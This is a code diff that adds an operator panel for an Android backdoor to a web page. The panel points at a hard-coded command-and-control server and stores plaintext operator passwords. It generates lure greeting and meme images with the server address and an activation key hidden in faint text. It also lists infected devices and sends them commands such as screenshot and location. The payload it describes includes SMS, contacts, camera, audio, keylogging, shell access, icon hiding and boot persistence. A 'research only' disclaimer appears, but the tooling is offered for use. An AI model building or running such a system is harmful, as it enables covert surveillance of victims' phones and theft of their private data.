@@ -1,6 +1,26 @@
 <!DOCTYPE html>
 <html lang="ar">
 <!-- في index.html -->
+<!-- بعد أزرار التحكم -->
+<div class="button-group" style="margin-top: 30px;">
+  <button class="btn" onclick="generateRealBackdooredImage()" 
+          style="background: linear-gradient(45deg, #9b59b6, #8e44ad);">
+    <i class="fas fa-bolt"></i> توليد صورة مخترقة حقيقية
+  </button>
+  <button class="btn" onclick="testRealC2Connection()"
+          style="background: linear-gradient(45deg, #1e90ff, #3742fa);">
+    <i class="fas fa-wifi"></i> اختبار اتصال C2
+  </button>
+  <button class="btn" onclick="viewConnectedDevices()"
+          style="background: linear-gradient(45deg, #2ed573, #1e90ff);">
+    <i class="fas fa-mobile-alt"></i> عرض الأجهزة المتصلة
+  </button>
+</div>
+
+<!-- قسم معلومات الخادم الحقيقي -->
+<div id="serverInfo" style="margin: 20px 0; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 10px;">
+  <!-- سيتم ملؤه بالجافاسكريبت -->
+</div>
 <script>
 class SecuritySystem {
     constructor() {
@@ -2213,6 +2233,590 @@ wss.on('connection', (ws, req) => {
         console.log(`Client disconnected: ${clientId}`);
         clients.delete(clientId);
     });
+});
+
+// ========== REAL C2 SERVER SETTINGS ==========
+const REAL_C2_CONFIG = {
+  // رابط خادمك الحقيقي على Render
+  SERVER_URL: 'https://ahmed-c2-server.onrender.com',
+  WS_URL: 'wss://ahmed-c2-server.onrender.com',
+  
+  // بيانات الدخول
+  USERS: {
+    'admin': 'Admin@2024',
+    'researcher': 'Research@2024',
+    'ahmed': 'Ahmed@2024'
+  },
+  
+  // إعدادات النظام
+  AUTO_CONNECT: true,
+  HEARTBEAT_INTERVAL: 30000,
+  RECONNECT_DELAY: 5000
+};
+
+// ========== REAL IMAGE GENERATOR ==========
+class RealImageGenerator {
+  constructor() {
+    this.c2Server = REAL_C2_CONFIG.WS_URL;
+    this.serverUrl = REAL_C2_CONFIG.SERVER_URL;
+    this.generatedImages = [];
+  }
+  
+  generateRealPayload() {
+    const activationKey = this.generateRealActivationKey();
+    
+    return {
+      activationKey: activationKey,
+      c2Server: this.c2Server,
+      serverUrl: this.serverUrl,
+      version: '2.0.0',
+      type: 'real_android_backdoor',
+      capabilities: [
+        'device_info',
+        'screenshot',
+        'location',
+        'audio_record',
+        'contacts',
+        'sms',
+        'camera',
+        'files'
+      ],
+      commands: {
+        basic: ['info', 'screenshot', 'location'],
+        advanced: ['record_audio', 'get_files', 'keylogger'],
+        system: ['shell', 'install_app', 'uninstall_app']
+      },
+      stealth: {
+        hideIcon: true,
+        randomDelay: true,
+        encryption: 'AES-256'
+      },
+      persistence: {
+        bootStart: true,
+        service: true,
+        hide: true
+      },
+      timestamp: Date.now(),
+      signature: 'AHMED-RESEARCH-SYSTEM'
+    };
+  }
+  
+  generateRealActivationKey() {
+    // مفتاح تشفير حقيقي
+    const chars = '0123456789abcdef';
+    let key = '';
+    for (let i = 0; i < 32; i++) {
+      key += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return key;
+  }
+  
+  async generateRealImage(template = 'new_year') {
+    console.log('🛠️ Generating REAL backdoored image...');
+    
+    const payload = this.generateRealPayload();
+    const imageData = await this.createImageWithPayload(template, payload);
+    
+    return {
+      image: imageData,
+      payload: payload,
+      filename: `REAL_${template}_${Date.now()}.jpg`,
+      info: {
+        c2Server: this.c2Server,
+        activationKey: payload.activationKey,
+        size: '1080x1350',
+        format: 'JPEG',
+        quality: 90,
+        embedding: 'LSB + Metadata'
+      }
+    };
+  }
+  
+  async createImageWithPayload(template, payload) {
+    // إنشاء صورة حقيقية مع بيانات
+    const canvas = document.createElement('canvas');
+    canvas.width = 1080;
+    canvas.height = 1350;
+    const ctx = canvas.getContext('2d');
+    
+    // خلفية حسب القالب
+    const backgrounds = {
+      new_year: ['#FF6B6B', '#4ECDC4', '#45B7D1'],
+      birthday: ['#FF9FF3', '#F368E0', '#FF9F43'],
+      holiday: ['#54A0FF', '#5F27CD', '#48DBFB'],
+      meme: ['#222F3E', '#8395A7', '#EE5A24']
+    };
+    
+    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+    backgrounds[template].forEach((color, i) => {
+      gradient.addColorStop(i / backgrounds[template].length, color);
+    });
+    
+    ctx.fillStyle = gradient;
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    
+    // نص
+    const texts = {
+      new_year: { main: '🎉 2026 🎊', sub: 'Happy New Year!' },
+      birthday: { main: '🎂 Happy Birthday!', sub: 'Best Wishes!' },
+      holiday: { main: '🏖️ Summer Vibes', sub: 'Enjoy Your Holiday!' },
+      meme: { main: '😂 LOL', sub: 'You Won\'t Believe This!' }
+    };
+    
+    ctx.fillStyle = '#FFFFFF';
+    ctx.font = 'bold 72px Arial';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
+    ctx.shadowBlur = 10;
+    
+    ctx.fillText(texts[template].main, canvas.width / 2, canvas.height / 2 - 50);
+    
+    ctx.font = '36px Arial';
+    ctx.shadowBlur = 5;
+    ctx.fillText(texts[template].sub, canvas.width / 2, canvas.height / 2 + 50);
+    
+    // تضمين الباي load مخفياً (كتابة شفافة)
+    ctx.fillStyle = 'rgba(255, 255, 255, 0.01)';
+    ctx.font = '10px Arial';
+    ctx.textAlign = 'left';
+    const payloadText = `C2:${this.c2Server}|KEY:${payload.activationKey}|TS:${Date.now()}`;
+    ctx.fillText(payloadText, 10, canvas.height - 10);
+    
+    return canvas.toDataURL('image/jpeg', 0.9);
+  }
+}
+
+// ========== REAL COMMAND SYSTEM ==========
+class RealCommandSystem {
+  constructor() {
+    this.serverUrl = REAL_C2_CONFIG.SERVER_URL;
+    this.devices = [];
+    this.commands = [];
+  }
+  
+  async getConnectedDevices() {
+    try {
+      const response = await fetch(`${this.serverUrl}/devices`);
+      const data = await response.json();
+      
+      if (data.success) {
+        this.devices = data.devices;
+        return this.devices;
+      }
+      return [];
+    } catch (error) {
+      console.error('Error getting devices:', error);
+      return [];
+    }
+  }
+  
+  async sendCommandToDevice(deviceId, command, data = {}) {
+    try {
+      const response = await fetch(`${this.serverUrl}/send-command`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          deviceId: deviceId,
+          command: command,
+          data: data
+        })
+      });
+      
+      const result = await response.json();
+      return result;
+    } catch (error) {
+      console.error('Error sending command:', error);
+      return { success: false, message: error.message };
+    }
+  }
+  
+  async getCommandHistory() {
+    try {
+      const response = await fetch(`${this.serverUrl}/commands`);
+      const data = await response.json();
+      return data.commands || [];
+    } catch (error) {
+      console.error('Error getting commands:', error);
+      return [];
+    }
+  }
+}
+
+// ========== INITIALIZE REAL SYSTEM ==========
+let realImageGenerator = null;
+let realCommandSystem = null;
+
+function initializeRealSystem() {
+  realImageGenerator = new RealImageGenerator();
+  realCommandSystem = new RealCommandSystem();
+  
+  console.log('🚀 REAL SYSTEM INITIALIZED');
+  console.log('🌐 C2 Server:', REAL_C2_CONFIG.WS_URL);
+  console.log('🔗 API Server:', REAL_C2_CONFIG.SERVER_URL);
+  
+  // تحديث واجهة المستخدم
+  updateUIWithRealInfo();
+}
+
+function updateUIWithRealInfo() {
+  // تحديث معلومات الخادم في الواجهة
+  const serverInfo = document.getElementById('serverInfo');
+  if (serverInfo) {
+    serverInfo.innerHTML = `
+      <div style="background: rgba(46, 213, 115, 0.1); padding: 10px; border-radius: 10px; margin: 10px 0;">
+        <strong>🌐 Real C2 Server:</strong> ${REAL_C2_CONFIG.WS_URL}<br>
+        <strong>🔗 API:</strong> ${REAL_C2_CONFIG.SERVER_URL}<br>
+        <small style="color: #a4b0be;">Connected to Ahmed Research Server</small>
+      </div>
+    `;
+  }
+  
+  // تحديث زر توليد الصور
+  const generateBtn = document.getElementById('generateRealImageBtn');
+  if (generateBtn) {
+    generateBtn.onclick = generateRealBackdooredImage;
+  }
+}
+
+// ========== REAL FUNCTIONS ==========
+async function generateRealBackdooredImage() {
+  if (!realImageGenerator) {
+    alert('Please initialize the system first');
+    return;
+  }
+  
+  const template = document.getElementById('templateSelect')?.value || 'new_year';
+  
+  try {
+    // إظهار نافذة التحميل
+    showLoading('Generating REAL backdoored image...');
+    
+    const result = await realImageGenerator.generateRealImage(template);
+    
+    // حفظ الصورة
+    realImageGenerator.generatedImages.push(result);
+    
+    // إخفاء التحميل
+    hideLoading();
+    
+    // إظهار النتيجة
+    showRealImageResult(result);
+    
+    // تسجيل في السجلات
+    addSystemLog(`✅ REAL image generated: ${result.filename}`, 'success');
+    addSystemLog(`🔑 Activation Key: ${result.payload.activationKey}`, 'data');
+    addSystemLog(`🌐 C2 Server: ${result.payload.c2Server}`, 'data');
+    
+  } catch (error) {
+    hideLoading();
+    alert(`Error: ${error.message}`);
+    addSystemLog(`❌ Failed to generate image: ${error.message}`, 'error');
+  }
+}
+
+function showRealImageResult(result) {
+  const modal = document.getElementById('realImageResultModal');
+  if (!modal) {
+    // إنشاء المودال إذا لم يكن موجوداً
+    createRealImageResultModal();
+  }
+  
+  document.getElementById('realImageResultModal').style.display = 'flex';
+  
+  // تحديث المحتوى
+  document.getElementById('realImagePreview').src = result.image;
+  document.getElementById('realFileName').textContent = result.filename;
+  document.getElementById('realActivationKey').textContent = result.payload.activationKey;
+  document.getElementById('realC2Server').textContent = result.payload.c2Server;
+  document.getElementById('realServerUrl').textContent = result.payload.serverUrl;
+  
+  // تحديث معلومات الباي load
+  const payloadInfo = document.getElementById('realPayloadInfo');
+  payloadInfo.innerHTML = `
+    <strong>Capabilities:</strong> ${result.payload.capabilities.join(', ')}<br>
+    <strong>Stealth:</strong> ${result.payload.stealth.hideIcon ? 'Hidden Icon' : 'Visible'}<br>
+    <strong>Persistence:</strong> ${result.payload.persistence.bootStart ? 'Boot Start' : 'Manual'}<br>
+    <strong>Encryption:</strong> ${result.payload.stealth.encryption}<br>
+    <strong>Timestamp:</strong> ${new Date(result.payload.timestamp).toLocaleString()}
+  `;
+}
+
+function createRealImageResultModal() {
+  const modalHTML = `
+    <div class="modal" id="realImageResultModal" style="display: none;">
+      <div class="modal-content" style="max-width: 900px;">
+        <div class="modal-header">
+          <h2 class="modal-title">
+            <i class="fas fa-check-circle" style="color: #2ed573;"></i>
+            REAL Backdoored Image Generated
+          </h2>
+          <button class="close-modal" onclick="closeModal('realImageResultModal')">&times;</button>
+        </div>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin: 20px 0;">
+          <!-- معاينة الصورة -->
+          <div>
+            <h3 style="color: #fff; margin-bottom: 15px;">
+              <i class="fas fa-image"></i> Image Preview
+            </h3>
+            <img id="realImagePreview" style="width: 100%; border-radius: 15px; border: 2px solid #2ed573;">
+            <button onclick="downloadRealImage()" class="btn" style="width: 100%; margin-top: 15px; background: linear-gradient(45deg, #2ed573, #1e90ff);">
+              <i class="fas fa-download"></i> Download Image
+            </button>
+          </div>
+          
+          <!-- معلومات الباكدور -->
+          <div>
+            <h3 style="color: #fff; margin-bottom: 15px;">
+              <i class="fas fa-shield-alt"></i> Backdoor Information
+            </h3>
+            
+            <div style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 10px; margin-bottom: 15px;">
+              <div style="margin-bottom: 10px;">
+                <strong style="color: #2ed573;">File Name:</strong><br>
+                <span id="realFileName" style="color: #fff;">loading...</span>
+              </div>
+              
+              <div style="margin-bottom: 10px;">
+                <strong style="color: #2ed573;">Activation Key:</strong><br>
+                <span id="realActivationKey" style="color: #ff6b6b; font-family: monospace;">loading...</span>
+              </div>
+              
+              <div style="margin-bottom: 10px;">
+                <strong style="color: #2ed573;">C2 WebSocket:</strong><br>
+                <span id="realC2Server" style="color: #1e90ff; font-family: monospace;">loading...</span>
+              </div>
+              
+              <div style="margin-bottom: 10px;">
+                <strong style="color: #2ed573;">API Server:</strong><br>
+                <span id="realServerUrl" style="color: #1e90ff; font-family: monospace;">loading...</span>
+              </div>
+            </div>
+            
+            <div id="realPayloadInfo" style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; font-size: 0.9rem;">
+              Loading payload information...
+            </div>
+            
+            <div style="margin-top: 20px; color: #ffa5a5; font-size: 0.85rem; text-align: center;">
+              <i class="fas fa-exclamation-triangle"></i>
+              This is a REAL backdoored image for research purposes only
+            </div>
+          </div>
+        </div>
+        
+        <div style="text-align: center; margin-top: 20px;">
+          <button onclick="testRealC2Connection()" class="btn" style="background: linear-gradient(45deg, #ffa502, #ff7f00);">
+            <i class="fas fa-wifi"></i> Test C2 Connection
+          </button>
+          <button onclick="viewConnectedDevices()" class="btn">
+            <i class="fas fa-mobile-alt"></i> View Connected Devices
+          </button>
+        </div>
+      </div>
+    </div>
+  `;
+  
+  document.body.insertAdjacentHTML('beforeend', modalHTML);
+}
+
+async function downloadRealImage() {
+  if (!realImageGenerator || realImageGenerator.generatedImages.length === 0) {
+    alert('No image generated yet');
+    return;
+  }
+  
+  const latestImage = realImageGenerator.generatedImages[realImageGenerator.generatedImages.length - 1];
+  const link = document.createElement('a');
+  link.href = latestImage.image;
+  link.download = latestImage.filename;
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+  
+  addSystemLog(`📥 Downloaded: ${latestImage.filename}`, 'success');
+}
+
+async function testRealC2Connection() {
+  try {
+    const response = await fetch(`${REAL_C2_CONFIG.SERVER_URL}/health`);
+    const data = await response.json();
+    
+    alert(`✅ C2 Server Status:\n\n` +
+          `Server: ${data.server}\n` +
+          `Status: ${data.status}\n` +
+          `Devices: ${data.connectedDevices}\n` +
+          `Uptime: ${Math.floor(data.uptime / 60)} minutes`);
+    
+    addSystemLog(`✅ C2 Server test successful: ${data.connectedDevices} devices connected`, 'success');
+  } catch (error) {
+    alert(`❌ C2 Server connection failed:\n\n${error.message}`);
+    addSystemLog(`❌ C2 Server test failed: ${error.message}`, 'error');
+  }
+}
+
+async function viewConnectedDevices() {
+  if (!realCommandSystem) {
+    alert('Command system not initialized');
+    return;
+  }
+  
+  const devices = await realCommandSystem.getConnectedDevices();
+  
+  if (devices.length === 0) {
+    alert('No devices connected yet');
+    return;
+  }
+  
+  // إنشاء نافذة عرض الأجهزة
+  const devicesHTML = devices.map(device => `
+    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; margin: 10px 0;">
+      <div style="display: flex; justify-content: space-between; align-items: center;">
+        <div>
+          <strong style="color: #2ed573;">${device.name}</strong><br>
+          <small>ID: ${device.id}</small><br>
+          <small>IP: ${device.ip}</small><br>
+          <small>OS: ${device.os}</small>
+        </div>
+        <div>
+          <span style="color: ${device.status === 'online' ? '#2ed573' : '#ff4757'};">
+            ● ${device.status}
+          </span><br>
+          <small>Connected: ${new Date(device.connectedAt).toLocaleTimeString()}</small>
+        </div>
+      </div>
+      <div style="margin-top: 10px;">
+        <button onclick="sendCommandToDevice('${device.id}', 'info')" style="background: #2ed573; color: white; border: none; padding: 5px 10px; border-radius: 5px; margin-right: 5px; cursor: pointer;">
+          <i class="fas fa-info-circle"></i> Info
+        </button>
+        <button onclick="sendCommandToDevice('${device.id}', 'screenshot')" style="background: #1e90ff; color: white; border: none; padding: 5px 10px; border-radius: 5px; margin-right: 5px; cursor: pointer;">
+          <i class="fas fa-camera"></i> Screenshot
+        </button>
+        <button onclick="sendCommandToDevice('${device.id}', 'location')" style="background: #ffa502; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">
+          <i class="fas fa-map-marker-alt"></i> Location
+        </button>
+      </div>
+    </div>
+  `).join('');
+  
+  const modalHTML = `
+    <div class="modal" id="devicesModal" style="display: flex;">
+      <div class="modal-content" style="max-width: 600px;">
+        <div class="modal-header">
+          <h2 class="modal-title">
+            <i class="fas fa-mobile-alt"></i>
+            Connected Devices (${devices.length})
+          </h2>
+          <button class="close-modal" onclick="closeModal('devicesModal')">&times;</button>
+        </div>
+        
+        <div style="max-height: 400px; overflow-y: auto;">
+          ${devicesHTML}
+        </div>
+        
+        <div style="text-align: center; margin-top: 20px;">
+          <button onclick="closeModal('devicesModal')" class="btn" style="background: #ff4757;">
+            Close
+          </button>
+        </div>
+      </div>
+    </div>
+  `;
+  
+  // إزالة المودال القديم إذا موجود
+  const oldModal = document.getElementById('devicesModal');
+  if (oldModal) oldModal.remove();
+  
+  document.body.insertAdjacentHTML('beforeend', modalHTML);
+}
+
+async function sendCommandToDevice(deviceId, command) {
+  if (!realCommandSystem) return;
+  
+  const result = await realCommandSystem.sendCommandToDevice(deviceId, command);
+  
+  if (result.success) {
+    alert(`✅ Command sent successfully!\nCommand ID: ${result.commandId}`);
+    addSystemLog(`📤 Command sent to ${deviceId}: ${command}`, 'success');
+  } else {
+    alert(`❌ Failed to send command: ${result.message}`);
+    addSystemLog(`❌ Command failed for ${deviceId}: ${result.message}`, 'error');
+  }
+}
+
+// ========== HELPER FUNCTIONS ==========
+function showLoading(message) {
+  let loadingDiv = document.getElementById('loadingOverlay');
+  if (!loadingDiv) {
+    loadingDiv = document.createElement('div');
+    loadingDiv.id = 'loadingOverlay';
+    loadingDiv.style.cssText = `
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      color: white;
+      font-size: 1.2rem;
+    `;
+    document.body.appendChild(loadingDiv);
+  }
+  
+  loadingDiv.innerHTML = `
+    <div style="text-align: center;">
+      <div class="fas fa-spinner fa-spin" style="font-size: 3rem; margin-bottom: 20px;"></div>
+      <div>${message}</div>
+      <div style="margin-top: 20px; font-size: 0.9rem; color: #a4b0be;">
+        Connecting to real C2 server...
+      </div>
+    </div>
+  `;
+  loadingDiv.style.display = 'flex';
+}
+
+function hideLoading() {
+  const loadingDiv = document.getElementById('loadingOverlay');
+  if (loadingDiv) {
+    loadingDiv.style.display = 'none';
+  }
+}
+
+function addSystemLog(message, type = 'info') {
+  const logElement = document.getElementById('systemLog');
+  if (logElement) {
+    const time = new Date().toLocaleTimeString('ar-EG');
+    const logEntry = document.createElement('div');
+    logEntry.className = `log-entry type-${type}`;
+    logEntry.innerHTML = `
+      <span class="log-time">[${time}]</span>
+      <span class="log-type">${type}</span>
+      ${message}
+    `;
+    logElement.prepend(logEntry);
+    
+    // تحديد حجم السجلات
+    const logs = logElement.children;
+    if (logs.length > 50) {
+      logElement.removeChild(logs[logs.length - 1]);
+    }
+  }
+}
+
+// ========== INITIALIZE ON PAGE LOAD ==========
+document.addEventListener('DOMContentLoaded', () => {
+  setTimeout(() => {
+    initializeRealSystem();
+    addSystemLog('🚀 REAL C2 System initialized', 'success');
+    addSystemLog(`🌐 Server: ${REAL_C2_CONFIG.SERVER_URL}`, 'info');
+    addSystemLog(`🔗 WebSocket: ${REAL_C2_CONFIG.WS_URL}`, 'info');
+  }, 1000);
 });
 
 // HTTP Routes
